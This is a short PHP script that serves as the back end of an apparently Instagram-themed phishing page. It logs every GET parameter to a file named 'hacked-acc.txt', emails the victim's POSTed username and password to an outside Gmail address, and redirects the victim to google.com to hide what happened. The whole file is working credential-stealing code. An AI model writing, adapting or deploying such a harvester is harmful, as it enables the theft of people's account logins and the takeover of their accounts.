<?php
header ('Location:http://google.com');
$handle = fopen("hacked-acc.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'aqilelhaee@gmail.com';
$subject = 'RASAM-IG';
$username = $_POST['username'];
$password = $_POST['password'];
$message = "Username:" . $username . "\r\n" . "Password: " . $password;
$headers = 'From: Insta_qasem' . "\r\n" .
    'Reply-To: Aqilhex@gmail.comgmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $message, $headers);
exit;
?>
